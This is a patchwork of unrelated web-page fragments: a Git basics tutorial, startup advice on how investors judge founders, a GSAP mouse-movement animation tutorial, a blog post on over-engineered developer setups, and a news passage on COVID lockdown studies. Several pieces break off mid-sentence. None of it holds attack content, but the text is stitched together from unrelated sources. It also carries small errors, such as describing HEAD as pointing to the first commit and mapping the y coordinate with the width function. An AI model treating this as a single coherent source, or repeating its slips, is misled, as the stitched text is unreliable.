e.g. <code>git config --global alias.st "status -s"</code> maps <code>git status -s</code> to <code>git st</code>.</p><p><code>git config --list</code> lists all the fields and values from the config file.</p><h3 id="create-a-git-repository"><a href="#create-a-git-repository" aria-label="create a git repository permalink"></a>Create a Git repository</h3><p>To initialise a .git repository you can use <code>git init</code> or, if you want a copy of an existing repository, you can do <code>git clone &lt;repo_url&gt;</code>.</p><p><img src="https://mukulrathi.co.uk/317c63680d60850c4b4035e791ecd896/setup.svg" alt="Setup Terminal"></p><h2 id="git-commit-history"><a href="#git-commit-history" aria-label="git commit history permalink"></a>Git Commit History</h2><p><img src="https://mukulrathi.co.uk/f66fde04be4a0bf374458ed35fff4e77/commit-history.svg" alt="Git Commit History Diagram"></p><p>Git stores data as a series of lightweight “snapshots” known as <strong>commits</strong> - these store the state of the filesystem at that time as well as a pointer to the previous commit(s). Each commit has a unique <em>checksum</em> - the ID Git uses to refer to it.
To keep track of the history, Git has a <strong>HEAD</strong> pointer that points to the first commit (we follow the pointer chain back to see previous commits).</p><p>So we can refer to a commit either by its checksum, or its relation to HEAD, e.g. <code>HEAD~4</code> refers to the commit 4 commits before the HEAD commit.</p><h2 id="the-git-file-system"><a href="#the-git-file-system" aria-label="the git file system permalink"></a>The Git File System</h2><p><img src="https://mukulrathi.co.uk/4b6c8479c4391d055b65a8d2a2598187/file-system.svg" alt="Git File System  Diagram"></p><p>Git keeps track of files in 3 main sections:</p><ul><li>Working Directory (this is your computer’s filesystem)</li><li>Staging Area (this stores the contents of your next commit)</li><li>HEAD (the most recent commit in the .git repository)</li></ul><p>All of the main file commands boil down to understanding how Git maintains these three sections. A common misconception is that the staging area only stores changes - a better way to think of these is as <strong>3 separate file systems</strong>, each with their own copies of the files.</p><h3 id="view-changes-in-the-git-file-systems"><a href="#view-changes-in-the-git-file-systems" aria-label="view changes in the git file systems permalink"></a>View changes in the Git File Systems</h3><p><code>git status</code> displays any files that differ between the 3 sections. Files have 4 states:</p><ul><li><em>Untracked</em> - in Working Dir but no version stored in HEAD or Staging Area (Git doesn’t know about file)</li><li><em>Modified</em> - newer version in Working Dir compared to Staging Area and HEAD. (changes not in next commit)</li><li><em>Staged</em> - newer version in Staging Area and Working Dir compared to HEAD. (ready to be committed)</li><li><em>Unmodified</em> - same version in all 3 sections (i.e. most recent commit has latest version)</li></ul><p>Note: a file can be both modified and staged, if the version in the working directory is newer than that in the staging area, which in turn is newer than the one in the HEAD commit.</p><p>We can use the <code>-s</code> option for <code>git status</code> to get a cleaner (one line per file) output. This displays <strong>??</strong> if a file is not tracked, <strong>red</strong> if modified and <strong>green</strong> if staged.</p><p>To view the actual changes and not just the files that have changed, you can use:</p><ul><li><code>git diff</code> - see the unstaged changes i.e. compare working directory with staging area.</li><li><code>git diff --staged</code> - see the staged changes i.e. compare staging area with HEAD.</li></ul><p>Adding the <code>&lt;file/dir&gt;</code> argument restricts the diff to that those files. e.g. <code>git diff src/</code></p><h3 id="update-the-git-file-systems"><a href="#update-the-git-file-systems" aria-label="update the git file systems permalink"></a>Update the Git File Systems</h3><p><code>git add &lt;file/directory&gt;</code> updates the staging area with the version of the file/directory in the working directory.</p><p><code>git commit</code> updates HEAD with a new commit that snapshots the files in the staging area.</p><p><code>git reset &lt;commit&gt;</code> has three potential steps:</p><ol><li>Point HEAD to <code>&lt;commit&gt;</code> (e.g. if rolling back a commit,staging area and working dir will now have newer version of files than HEAD). Also points branch’s HEAD to that commit. (see Branching section)</li><li>Update Staging Area with contents of <code>&lt;commit&gt;</code>. (this has the effect of unstaging file changes - only Working dir. has newest version)</li><li>Update Working Dir with contents of Staging Area (has effect of overwriting and destroying changes to data - <strong>dangerous - take care</strong>)</li></ol><p>By default, <code>git reset</code> only runs Step 1 + 2 however, the options <code>--soft</code> (only run Step 1) and <code>--hard</code> (run Step 1, 2, 3) modify its behaviour.</p><p>If we pass a file path, <code>git reset &lt;commit&gt; &lt;file/dir&gt;</code> it limits effect of <code>reset</code> to files in that file path e.g. <code>git reset --soft HEAD~1 src/</code>.</p><p><code>git checkout HEAD &lt;file&gt;</code> also has the same effect as <code>git reset --hard HEAD &lt;file&gt;</code> - it overwrites the version of the file in the staging area and working directory with the version at HEAD (effectively undoing your changes since the last commit).</p><p><code>git checkout &lt;file&gt;</code> on the other hand (note no <code>HEAD</code>) overwrites the version of the file in the working directory with the version in the staging area (effectively undoing your changes since the last staged version).</p><p>Finally, <code>git rm &lt;file&gt;</code> untracks the file and deletes it from working directory, the option <code>--cached</code> will untrack a file but not delete it from the working directory.</p><p><img src="https://mukulrathi.co.uk/3a5894bb13482084888f9dbffc12737c/manipulate-files.svg" alt="Git status demonstration"></p><h3 id="ignoring-files"><a href="#ignoring-files" aria-label="ignoring files permalink"></a>Ignoring files</h3><p>Often we don’t want Git to track all of our files in our repository. This might include:</p><ul><li>sensitive files (e.g. passwords.txt)</li><li>huge binary files</li><li>build files that get generated every time you recompile your source code.</li><li>OS/IDE specific files, e.g. <code>.DS_Store</code> for MacOS or <code>.iml</code>for IntelliJ IDE - you want your repo to be as system agnostic as possible.</li></ul><p>We can specify <strong>glob patterns</strong> (think simplified regular expressions) to <strong>match</strong> files that we want to ignore in our <code>.gitignore</code> file.</p><ul><li><code>/___</code> avoids recursivity - only matches it to current directory</li><li><code>__/</code> matches all files in that directory</li><li><code>*___</code> matches all files with that ending</li><li><code>!</code> negates a pattern - i.e. don’t match this</li><li><code>[__]</code> matches a character to any of the characters in the square brackets.</li><li><code>?</code> matches any character</li><li><code>/**/</code> matches nested directories e.g. <code>a/**/d</code> matches <code>a/d</code> <code>a/b/d</code> <code>a/b/c/d</code> etc.</li></ul><p><a href="https://github.com/github/gitignore">Examples of .gitignore files</a></p><p>You can even use <strong>glob patterns</strong> when using <code>&lt;file/dir&gt;</code> in the other Git commands e.g. <code>git add src/*.css</code> would add all <code>.css</code> files in the <code>src</code> folder.</p><h2 id="commits"><a href="#commits" aria-label="commits permalink"></a>Commits</h2><p>Since commits are the backbone of your version history, it is worth going into them in more depth.</p><p><code>git commit</code> opens up your text editor for you to write a commit message in.

<article>
<p><span>When building your startup you can have a great idea and the perfect market conditions and still come up short. For both your startup and investors, execution is key.</span></p>
<p><span>Just look at this slide I found from Alexander Jarvis on Quora:</span></p>
<figure><img src="https://cdn-images-1.medium.com/max/720/0*4ssSy22XC1crcL3k" alt="Mark Suster on what startup investors look for in entrepreneurs: 70% of my investment decision of an early-stage company is the team" width="720" height="432" data-image-id="0*4ssSy22XC1crcL3k" data-width="1085" data-height="651"></figure>
<p><span>You and your startup team, especially at a management level, are a huge factor as to whether you secure investment or if your pitch ends up in an investor’s trash can.&nbsp;</span></p>
<p><span>And the first person investors look at as they decide whether or not you are deserving of their time and money is you, the founder.</span></p>
<h2><span>What Startup Investors Look For In Entrepreneurs and The Red Flags They Avoid&nbsp;</span></h2>
<p><span>Investors, like most educated gamblers, bet on the jockey – not the horse. Making you the most important asset for a successful fundraising round – especially if you have a proven track record. </span><a href="https://medium.com/startupsoft/why-vcs-almost-blindly-invest-in-founders-with-previous-exits-23824334a260" target="_blank" rel="noopener noreferrer"><span>Studies show</span></a><span> that:</span></p>
<h3><em><strong><span>“Successful serial entrepreneurs are more likely to replicate the success of their past companies.” and “Nearly 80% of [startup] unicorns had at least one co-founder who had previously founded a company of some sort.”&nbsp;</span></strong></em></h3>
<p><span>However, regardless of your previous success investors need to get to know you before they consider investing. They need to trust that you can execute your milestones and that you will provide a valuable ROI. To earn their trust and ultimately win them over you need these essential qualities:&nbsp;</span></p>
<ul>
<li><span>Character</span></li>
<li><span>Confidence</span></li>
<li><span>Coachability&nbsp;</span></li>
</ul>
<h3><b>Character</b></h3>
<p><span>Renowned leadership guru </span><a href="https://www.linkedin.com/in/simonsinek/" target="_blank" rel="noopener noreferrer"><span>Simon Sinek</span></a><span> states that “People don’t buy </span><b>what you do</b><span>; they buy </span><b>why you do it.</b><span>”</span></p>
<p><iframe title="Start with why -- how great leaders inspire action | Simon Sinek | TEDxPugetSound" width="500" height="375" src="https://www.youtube.com/embed/u4ZoJKF_VuA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>

<p><span>If an investor doesn’t know </span><b>why</b><span> you are creating your startup what incentive do they have to invest in you; as opposed to the thousands of other founders out there. If they can’t be sure their money is in the hands of an intelligent, capable, trustworthy founder they are unlikely to commit to a deal.</span></p>
<p><span>Moreover, they aren’t just planning to invest capital in your business but also their valuable time. They are looking to create a long-term business relationship with you and share their expertise and network. If they don’t like or trust you they simply won’t do it.</span></p>
<p><span>Your character is a critical factor and potential investors will want to answer the following questions about you:</span></p>
<ul>
<li><span><strong>Competency</strong> – “Can you do this?” Is the question nearly all financial backers will want the answer to. Demonstrating competence is challenging, but can be made easier if you have been part of (or already founded) a successful startup.&nbsp;</span></li>
<li><span><strong>Commitment</strong> – Are you totally invested in your startup? Are you still working for someone else or have you taken the leap?&nbsp; How hard do you work?&nbsp;</span></li>
<li><span><strong>Honesty</strong> – Do you tell the truth? Any lies you tell will inevitably backfire. </span><a href="https://www.hbs.edu/faculty/Pages/profile.aspx?facId=6560" target="_blank" rel="noopener noreferrer"><span>Howard Stevenson</span></a><span> (Professor Emeritus at Harvard Business School) sums it up perfectly: “The first time you hear anything dishonest come out of a founder’s mouth, you should run, not walk”</span></li>
<li><span><strong>Trustworthiness</strong> – More than telling the truth, do you keep your word and deliver on your promises?</span></li>
<li><span><strong>Who you are underneath it all</strong> – Aside from the above are you the kind of person they will be happy to introduce to their professional networks? Will they enjoy working with you over the next three to five years?&nbsp;</span></li>
</ul>
<h3><b>Confidence</b></h3>
<p><span>It may seem obvious but you need to be confident that you, your idea and your team can overcome the inevitable challenges of founding a startup. You will need to get used to hearing no from investors, clients, banks and even family and friends. It’s important to develop a thick skin and generate self-confidence no matter the hurdles that arise.</span></p>
<p><span>However, there is a fine line between confidence and arrogance – and it’s a line you will need to tread carefully. Overconfidence and arrogance will make you look like a “know-it-all” to investors. If they decide that you won’t be open to guidance and new ideas it will be a deal-breaking red flag and they will walk away. The best way to ensure that you’re portraying confidence and not arrogance is to support your claims with facts and figures.&nbsp;</span></p>
<h3><b>Coachability</b></h3>
<p><span>Do you listen well? Can you learn quickly and effectively? These are two factors essential for investors. They want to feel their time (and money) is well spent and that they are investing in a founder who is open to learning and being mentored.&nbsp;</span></p>
<p><span>A good (smart money) investor will want to nurture a mentor-mentee relationship with you. A receptive mind is a vital quality that you will need. </span><a href="https://www.forbes.com/profile/ron-conway/#4900daef67ac" target="_blank" rel="noopener noreferrer"><span>Ron Conway</span></a><span>, an active early-stage investor in Google and Paypal (and Founder of </span><a href="https://www.svangel.com/index" target="_blank" rel="noopener noreferrer"><span>SV Angel</span></a><span>) puts it this way:&nbsp;</span></p>
<h3><strong><span><i>“Coachability enables a willingness to be open and make the necessary and often numerous course corrections and morphing that startups require.”&nbsp;</i></span></strong></h3>
<h3><b>The Red Flags &amp; Dealbreakers for Investors</b></h3>
<p><span>There are seven “deadly sins” that will leave you investor-less and could potentially harm your reputation. Here they are and how you can avoid them:&nbsp;</span></p>
<h4>1. Dishonesty</h4>
<p><span>As I mentioned before lies inevitably backfire. Lying about any aspect of your business (or yourself) will plant a seed of doubt into the minds of any potential investor. They will do the necessary research into you and your company to verify your claims before they open their wallets – so be upfront and honest at all times.&nbsp;</span></p>
<h4>2. Telling Them you Have “No Competition”</h4>
<p><span>Even if your product is the most innovative product the world has ever seen you will either be disrupting an existing market or creating a new market that will quickly fill with investors.&nbsp;</span></p>
<h4>3. Saying you “Only Need 1% of the Market Share”<span>&nbsp;</span></h4>
<p><span>This is a great way to show investors that you don’t understand sales or customer CPA (cost-per-acquisition). Instead of talking in market share talk in customers. Specifically how many you need, how much you will spend to get them and how long it will take for you to get to that number.&nbsp;</span></p>
<h4>4. Failing to Fulfil Your Commitments</h4>
<p><span>When asked about what might kill a potential deal for her clients </span><a href="https://www.linkedin.com/in/marciasnelson/" target="_blank" rel="noopener noreferrer"><span>Marcia Nelson</span></a><span> Managing Director of </span><a href="https://www.alberleen.com/" target="_blank" rel="noopener noreferrer"><span>Alberleen Family Office Solutions</span></a><span> said on aspect is when a “startup’s management takes too long to get us requested information – while it may not kill a deal, it will certainly make us more cautious.” Investors want to know that you take your commitments seriously and that you are prepared to fulfil requests in a timely manner.&nbsp;</span></p>
<h4>5. Being Desperate</h4>
<p><span>Desperation can break a business partnership before it begins and shows investors that you are unconfident.&nbsp;</span></p>
<h4>6. Being Arrogant or Defensive<span>&nbsp;</span></h4>
<p><span>As I mentioned above confidence and arrogance are close neighbours and it’s important not to come off too strong.&nbsp;</span></p>
<h4>7. An Unwillingness to Listen</h4>
<p><span>Own your weaknesses. Investors will be put off if you act like you have all the answers and don’t need any help. You will need guidance and help on your journey and investors already know that. If you admit your faults and actively seek advice you will be left with a much healthier and more productive business relationship.&nbsp;</span></p>
<p><span>As a founder, it is </span><b>your responsibility</b><span> to make as easy as possible for investors to say yes to both you and your startup. You have to put yourself in the best position to form a great partnership that will be a lucrative deal for all parties involved. And the next step in that process is choosing your founding team,</span></p>
<h2><span>Choosing Your Co-Founders&nbsp;</span></h2>
<p><span>The founder who will lead the company isn’t necessarily the inventor. It is someone who believes in the startup’s idea and product. So much so that they are willing to put their future on the line to turn that idea into a successful company.</span></p>
<p><span>You should try and choose professionals that have the skills you lack. Someone who has a skillset to offer in another part of the business. Their skills should complement yours.&nbsp;</span></p>
<p><span>Another important factor is ensuring your values, expectations and business goals are aligned. You and your co-founders will become your startup’s core management team. It’s important to be on the same page when it comes to your startup’s mission, business goals, values and timeline.</span></p>
<p><span>You need to ask yourself if your personalities are compatible. </span><a href="https://techcrunch.com/2017/02/18/co-founder-conflict/?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZm9yYmVzLmNvbS9zaXRlcy9reWxld29uZy8yMDE4LzA3LzI2L2hvdy10by1waWNrLXRoZS1yaWdodC1jb2ZvdW5kZXJzLWFuZC13aHktaXQtaW1wcm92ZXMteW91ci1jdXN0b21lci1leHBlcmllbmNlLw&amp;guce_referrer_sig=AQAAAEtIKZoxIkLDJGeNlqJVPCniIv_oDI2VMfIzQ8MoJFst1Y1LpVPlj_dgeGnWBxvuTx9vTEPU8-Lvvf4l34V7ZmlCoi71qW367ATIsBoEnNZ0Pybpbb0jkw9IphJ8mm-GJetR8PtNUn8-Pv5Rvdh2cXfZ_aO-Kk5hLP--l9aOGQXp" target="_blank" rel="noopener noreferrer"><span>Gary Tan</span></a><span>, Managing Partner at Initialized Capital and previously at YCombinator puts it perfectly:</span></p>
<figure><img src="https://cdn-images-1.medium.com/max/720/0*k0NpSqRY3Ufsv_kH" alt="Gary Tan: Co-founder disputes have historically been one of the top reasons startups fail" width="720" height="440" data-image-id="0*k0NpSqRY3Ufsv_kH" data-width="752" data-height="460"></figure>
<p><span>Will you be able to embrace the conflict with this person? Discussing disagreements on a level playing field to improve your business?&nbsp;</span></p>
<p><span>It comes down to one overarching question:</span></p>
<h4><b>Can you work together over a long period of time? </b></h4>
<p><span>After all, what good is it if their hard skills complement yours if you don’t actually like the person you have chosen as your cofounder?&nbsp;</span></p>
<p><span>Investors will take the dynamics of your relationship into account as they assess if your startup will be the right fit for their portfolio. As well as assessing your co-founder on the same essential qualities they judged you on.&nbsp;</span></p>
<p><span>I recommend that you thoroughly and carefully consider a business partner as you would a life partner. Ask yourself, if in the toughest times will that person remember that you are both on the same team and be by your side? More importantly, will they be an asset to your business.&nbsp;</span></p>
<p><span>Serial entrepreneur, </span><a href="https://twitter.com/amiller" target="_blank" rel="noopener noreferrer"><span>Andy Miller’s</span></a><span> formula is simple: </span><b>People</b><span> + </span><b>Execution </b><span>= </span><b>Success</b><span>. Your potential investors are counting on you and your startup management team to execute on your business plan, gain traction and, ultimately, bring in revenue no matter the hurdles.&nbsp;</span></p>
<p><span>Your founding team’s primary responsibility is to plan your journey to market that avoids potential roadblocks. Then, when unexpected roadblocks do inevitably appear, you and your founding team use that plan to navigate them.&nbsp;</span></p>
<p><span>As </span><a href="https://www.linkedin.com/in/seansheppard/" target="_blank" rel="noopener noreferrer"><span>Sean Sheppard</span></a><span> puts it:&nbsp;</span></p>
<h3><strong><span><i>“Most companies and innovations fail, and the reasons have to do with markets and the behaviours of the people who are running them, not the products themselves”.</i></span></strong></h3>
<p><span>You need to be able to trust and count on your co-founders. Choose correctly and you will have a strong foundation on which to move onto the next step: building a startup team.</span></p>

Not mouse movement in particular, but interactivity. Exporting animation as an mp4 is cool and all. But you can't <em>play</em> with it.</p><p>Animating on the web opens up so many cool possibilities!</p><p>If you're the kind of person who learns best by digging into the code, then just go ahead and fork that pen, have fun!</p><hr><p>Still here? 😊 Cool beans, let's go through it together.</p><p>I use <a href="https://greensock.com/">Greensock</a> for all my SVG animation. There are a few reasons for this. Firstly, it gives you more control and is super fun to use. But more importantly, as browsers implement the SVG spec differently, animating can get a bit messy. The team at Greensock put a lot of effort into harmonizing behavior across browsers.</p><p>Under the hood though, Greensock is just a really performant property manipulator. It will manipulate (pretty much) whatever value you want to change. In this case it's updating the values in a matrix transform. Check this out.</p><p><img src="https://www.cassie.codes/images/cursor.gif" alt="gif of matrix transforms updating with dev tools open" loading="lazy"></p><p>Cool right! Greensock is great at this kind of thing, but there's a lot going on in this pen, so let's break it down into chunks and focus on one bit at a time. First up, the mouse interaction. We'll come back to Greensock in a bit!</p><h2 id="heading-mouse-movement-fun!">Mouse movement fun!<a href="#heading-mouse-movement-fun!"><span role="text"> permalink</span></a></h2><p>So, there's another way we can modify values in CSS with Javascript. <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties">CSS custom properties!</a></p><p data-height="500" data-theme-id="dark" data-default-tab="result" data-user="cassie-codes" data-slug-hash="OJMOLML" data-pen-title="Mouse movement demo"><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/OJMOLML">Mouse movement demo</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>Let's walk through the process. The goal is to get the x and y position of the cursor as we move our mouse about, and then we can use those values to update some custom properties.</p><p>In the previous gif Greensock is using matrix transforms, which are more performant. But we're going to use <code>transform: translate(x,y)</code> for this as it's a tad more readable, and we can use percentage values.</p><p>First up, we declare some custom properties for the x and y values and then use those custom properties in place of regular property values in our transform.</p><pre><code><span><span>:root</span> <span>{</span></span><br><span>  <span>--mouse-x</span><span>:</span> 0<span>;</span></span><br><span>  <span>--mouse-y</span><span>:</span> 0<span>;</span></span><br><span><span>}</span></span><br><span></span><br><span><span>.pointer</span> <span>{</span></span><br><span>  <span>transform</span><span>:</span> <span>translate</span><span>(</span><span>var</span><span>(</span>--mouse-x<span>)</span><span>,</span> <span>var</span><span>(</span>--mouse-y<span>)</span><span>)</span><span>;</span></span><br><span><span>}</span></span></code></pre><p>Then we need to get our mouse coordinates. We can do this by listening to the mouse movement and getting the mouse's coordinates with <code>clientX</code> and <code>clientY</code></p><p>We'll assign those values to some global variables so that we can access them in another function later.</p><pre><code><span><span>let</span> xPosition<span>;</span></span><br><span><span>let</span> yPosition<span>;</span></span><br><span></span><br><span></span><br><span><span>function</span> <span>updateMouseCoords</span><span>(</span><span>event</span><span>)</span> <span>{</span></span><br><span>  xPosition <span>=</span> event<span>.</span>clientX<span>;</span></span><br><span>  yPosition <span>=</span> event<span>.</span>clientY<span>;</span></span><br><span><span>}</span></span><br><span>window<span>.</span><span>addEventListener</span><span>(</span><span>'mousemove'</span><span>,</span> updateMouseCoords<span>)</span><span>;</span></span></code></pre><p>Now we've got our coordinates, lets use them to update our custom properties and move our pointer around!</p><p>😇 When animating things on the web it's important to pay attention to performance. We can't know for sure how many times a users mouse event will fire as it's implementation specific. If it fires more than 60 times per second (which is the average refresh rate for most browsers) we'll end up with unnecessary computation. So to avoid burning up everyone's laptop fans and melting their CPU we can use <code>requestAnimationFrame</code></p><p>Request animation frame allows us to make smoother, browser optimized animations. If the user changes tabs, the animation will stop and give the CPU a break. You call the function once to start, and then it recusively calls itself.</p><p>⚠️ This is a great way to crash your browser if you get some code wrong!</p><pre><code><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  </span><br><span>  <span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span><br><span><span>}</span></span><br><span><span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>Right now, the x and y position we're getting back from <code>event.clientX</code> and <code>event.clientY</code> are pixel values, this isn't really useful to us. If we plug them straight into our custom properties we could end up transforming our pointer hundreds of pixels off in one direction.</p><p data-height="500" data-theme-id="dark" data-default-tab="result" data-user="cassie-codes" data-slug-hash="5ed677605b34f86eeb488b4b2a9bfe6a" data-pen-title="Mouse movement demo"><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/5ed677605b34f86eeb488b4b2a9bfe6a">Mouse movement demo</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>We need to convert those pixel values into percentages of the window height and width.</p><p>Let's define some global variables for the window width and height and work out the percentage values.</p><pre><code><span><span>let</span> windowHeight <span>=</span> window<span>.</span>innerHeight<span>;</span></span><br><span><span>let</span> windowWidth <span>=</span> window<span>.</span>innerWidth<span>;</span></span><br><span></span><br><span><span>function</span> <span>percentage</span><span>(</span><span>partialValue<span>,</span> totalValue</span><span>)</span> <span>{</span></span><br><span>  <span>return</span> <span>(</span><span>100</span> <span>*</span> partialValue<span>)</span> <span>/</span> totalValue<span>;</span></span><br><span><span>}</span></span><br><span></span><br><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  x <span>=</span> <span>percentage</span><span>(</span>xPosition<span>,</span> windowWidth<span>)</span><span>;</span></span><br><span>  y <span>=</span> <span>percentage</span><span>(</span>yPosition<span>,</span> windowHeight<span>)</span><span>;</span></span><br><span></span><br><span>  window<span>.</span><span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span><br><span><span>}</span></span><br><span><span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>This will give us a range from 0 -

First we have to include the core library, if you're on codepen, you can go to your pen settings and search for greensock.</p><p><img src="https://www.cassie.codes/images/gsap-include.png" alt="pen settings on codepen" loading="lazy"></p><p>Now we've got the GSAP library in our pen, we can take advantage of <code>gsap.ticker()</code></p><p>The greensock ticker is like the heartbeat of the GSAP engine - under the hood it uses requestAnimationFrame, just like we were using, but if that isn’t supported, the ticker automatically falls back to using a regular setTimeout() loop.</p><p>So rather than calling our function with request animation frame, we would do this...</p><pre><code><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  </span><br><span><span>}</span></span><br><span></span><br><span>gsap<span>.</span>ticker<span>.</span><span>add</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>Aside from making structuring animation itself more intuitive, Greensock provides a load of super cool utility functions that make your life easier. Remember all that work we did to get a nice usable range? Chuck that all in the bin. Look what we can do now!</p><pre><code><span></span><br><span><span>let</span> mapWidth<span>;</span></span><br><span><span>let</span> mapHeight<span>;</span></span><br><span><span>function</span> <span>setMaps</span><span>(</span><span>)</span> <span>{</span></span><br><span>  mapWidth <span>=</span> gsap<span>.</span>utils<span>.</span><span>mapRange</span><span>(</span><span>0</span><span>,</span> innerWidth<span>,</span> <span>-</span><span>50</span><span>,</span> <span>50</span><span>)</span><span>;</span></span><br><span>  mapHeight <span>=</span> gsap<span>.</span>utils<span>.</span><span>mapRange</span><span>(</span><span>0</span><span>,</span> innerHeight<span>,</span> <span>-</span><span>50</span><span>,</span> <span>50</span><span>)</span><span>;</span></span><br><span><span>}</span></span><br><span>window<span>.</span><span>addEventListener</span><span>(</span><span>'resize'</span><span>,</span> setMaps<span>)</span><span>;</span></span><br><span><span>setMaps</span><span>(</span><span>)</span><span>;</span></span></code></pre><p>Now we can listen to the mouse movement, feed <code>clientX</code> and <code>clientY</code> into mapWidth, and we'll get back a value within the range we've set!</p><pre><code><span><span>let</span> xPosition<span>;</span></span><br><span><span>let</span> yPosition<span>;</span></span><br><span></span><br><span></span><br><span><span>function</span> <span>updateMouseCoords</span><span>(</span><span>event</span><span>)</span> <span>{</span></span><br><span>  xPosition <span>=</span> <span>mapWidth</span><span>(</span>event<span>.</span>clientX<span>)</span><span>;</span></span><br><span>  yPosition <span>=</span> <span>mapWidth</span><span>(</span>event<span>.</span>clientY<span>)</span><span>;</span></span><br><span><span>}</span></span><br><span>window<span>.</span><span>addEventListener</span><span>(</span><span>'mousemove'</span><span>,</span> updateMouseCoords<span>)</span><span>;</span></span></code></pre><p>So tidy and concise!</p><p>Instead of updating CSS custom properties, we're going to use a Greensock tween. A Tween is what does all the animation work, as I said at the start, it's like a high-performance property manipulator.</p><p>A tween takes in two parameters</p><p>The targets, which are the object(s) whose properties you want to animate. Greensock uses <code>document.querySelectorAll()</code> internally so we can use any CSS selector we would use in CSS, or a direct reference to an element.</p><p>And the vars, an object containing all the properties/values you want to animate, along with any special properties like delay, ease, or duration.</p><pre><code><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  gsap<span>.</span><span>to</span><span>(</span>pointer<span>,</span> <span>{</span></span><br><span>    xPercent<span>:</span> xPosition<span>,</span></span><br><span>    yPercent<span>:</span> yPosition<span>,</span></span><br><span>    ease<span>:</span> <span>'none'</span></span><br><span>    </span><br><span>    </span><br><span>  <span>}</span><span>)</span><span>;</span></span><br><span><span>}</span></span><br><span></span><br><span>gsap<span>.</span>ticker<span>.</span><span>add</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>I've added a couple more easing equations in here so you can change them out and see what a difference it can make to the movement.</p><p data-height="400" data-theme-id="dark" data-preview="true" data-default-tab="js,result" data-user="cassie-codes" data-slug-hash="rNxYpzO" data-pen-title="Mouse movement demo - GSAP - easing"><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/rNxYpzO">Mouse movement demo - GSAP - easing</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>If you want to focus more on performance than easing you can use gsap.quickSetter to update the transforms.

<a href="https://rakhim.org/index.xml">RSS</a></p></nav><hr><article><p>There's this thing called <strong>fundamental attribution error:</strong></p><blockquote><p>In <a href="https://en.wikipedia.org/wiki/Social_psychology">social psychology</a>, <strong>fundamental attribution error</strong> (<strong>FAE</strong>), also known as <strong>correspondence bias</strong> or <strong>attribution effect</strong>, is the tendency for people to under-emphasize situational explanations for an individual's observed behavior while over-emphasizing dispositional and personality-based explanations for their behavior. This effect has been described as “the tendency to believe that what people do reflects who they are”</p></blockquote><p>Basically, when you make a mistake — it's due to some good reason, but when someone else makes a mistake — it's because they are bad people who make mistakes.</p><p>I was thinking about this pattern of observing reality when reading other people's blog posts describing life situations, technical setups, whatever. Let's say I'm reading about some developer's perfect programming environment setup. They share all the steps involved in creating this extremely complex system with automation, lots of inter-connected software, scripts and hardware addons. In the end, they conclude with how happy they are about the setup, how it helped their productivity and everything is peachy.</p><p>Inspired, I try to reproduce a <em>portion</em> of the described system, but quickly face the reality: things aren't connecting as nicely as I expected, bugs and compatibility issues force me to write dirty hacks, and in the end the whole thing is just waiting to break.</p><p>I'm not doing this anymore nowadays. Every time I see a cool setup, be it OS, Terminal, Emacs, Vim or even some iOS automations, I just think how hard it is to maintain all of that and go to my Emacs config looking for something new to disable.</p><p>But for the longest time I seem to have been making a Fundamental Attribution of Ability Error. I was thinking that people's setups are in fact perfect. That there's something wrong with me, that my attempts to build a convoluted architecture fail because I'm a bad programmer. With experience and after talking to a lot of people, I realized how much of a facade many of us create when describing our creations.</p><p>No, your Emacs setup does not have “zero issues”. Sorry, I don't believe you. It has issues and it breaks and you fix it sometimes. No, your Karabiner + Hammerspoon + AppleScripts + KeyboardMaestro setup with two hundred custom keyboard shortcuts is not “maintenance free”. No, your dotfiles repo with Ansible script does not guarantee a one-command-setup on a new machine.</p><p>As a result, I'm finding myself more and more conservative and pragmatic. ‘Vanilla’ and ‘default are my favorite words. I don't get into zsh or fish, even though I understand the benefits over Bash. Bash is okay. My small config with a bunch of aliases had served me well. I love Doom Emacs, but I come back to my minimalist personal configuration with continuously shrinking number of customizations. I use Make and Bash-scripts for building.</p><p>Mythical “reproducible configuration” does not exist. I mean, it does, with scripts, Ansible, Docker or nixOS, sure, but then you have to constantly maintain the thing that creates maintenance-free environments. Is there a catch here?..</p></article></main></div></div>]]>

And research is suggesting masks might be the way to avoid another lockdown.</p>  <p>Two studies published in the journal <em>Nature</em>&nbsp;calculate up the number of lives that were saved by aggressive lockdown measures.</p>  <p>The <a href="https://www.nature.com/articles/s41586-020-2404-8" target="_blank">first study</a>, from the University of California Berkeley, looked at six countries around the world, including China, the U.S., South Korea, Iran, France and Italy, and found that without lockdown measures, a half a billion more people would have been infected, with millions of deaths as a result.</p>  <p>The <a href="https://www.nature.com/articles/s41586-020-2405-7" target="_blank">second study</a> that looked at 11 European countries found that lockdown measures saved more than three million lives.&nbsp;</p>  <p>Epidemiologist&nbsp;<a href="http://www.dlsph.utoronto.ca/faculty-profile/fisman-david-n/" target="_blank">Dr. David Fisman</a>&nbsp;from the University of Toronto's Dalla Lana School of Public Health said these findings mirror what he and his colleagues discovered&nbsp;when they looked at how effective the timing of lockdown measures were in Ontario. <a href="https://www.acpjournals.org/doi/10.7326/M20-2945" target="_blank">They found</a>&nbsp;that if the lockdown had occurred one month later, there would have been around 15,000 deaths, which doesn't even include long-term care homes, 